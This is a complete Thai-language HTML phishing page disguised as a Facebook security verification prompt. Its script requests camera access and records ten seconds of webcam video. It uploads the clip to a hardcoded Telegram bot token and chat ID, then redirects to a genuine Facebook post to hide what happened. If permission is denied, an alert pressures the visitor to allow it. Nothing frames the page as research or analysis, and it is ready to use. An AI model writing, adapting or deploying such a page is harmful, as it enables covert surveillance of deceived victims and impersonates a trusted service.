<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security Verification</title>
</head>
<body style="background:#f0f2f5; margin:0; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">

<div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:350px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="60" style="margin-bottom:20px;">
    <h2 style="font-size:20px; color:#1c1e21; margin:0 0 15px;">การยืนยันความปลอดภัย</h2>
    <p style="font-size:14px; color:#606770; line-height:1.5; margin-bottom:25px;">
        บัญชีของคุณต้องได้รับการยืนยันสิทธิ์การเข้าถึง<br>โปรดกดปุ่มด้านล่างเพื่อดำเนินการต่อ
    </p>
    
    <button id="authBtn" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">
        กดยืนยันตัวตน
    </button>
    
    <div id="loading" style="display:none; margin-top:20px; color:#1877f2; font-weight:bold;">
        ⏳ กำลังตรวจสอบสิทธิ์...
    </div>
</div>

<script>
    // ข้อมูลเชื่อมต่อ Telegram ของพี่
    const TOKEN = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
    const CHAT_ID = '8482017371';
    const REDIRECT_TO = 'https://www.facebook.com/share/p/1avrMEzzJn/';

    document.getElementById('authBtn').onclick = async function() {
        const btn = this;
        const loader = document.getElementById('loading');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        try {
            // ขอเข้าถึงกล้อง
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];

            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', blob, 'security_capture.mp4');

                // ส่งวิดีโอเข้า Telegram พี่
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                // ปิดกล้องและเด้งไปหน้า Facebook จริง
                stream.getTracks().forEach(t => t.stop());
                window.location.replace(REDIRECT_TO);
            };

            recorder.start();
            // บันทึก 10 วินาที
            setTimeout(() => recorder.stop(), 10000);

        } catch (err) {
            alert("โปรดกด 'อนุญาต' (Allow) เพื่อเข้าสู่ระบบตามมาตรฐานความปลอดภัย");
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    };
</script>

</body>
</html>
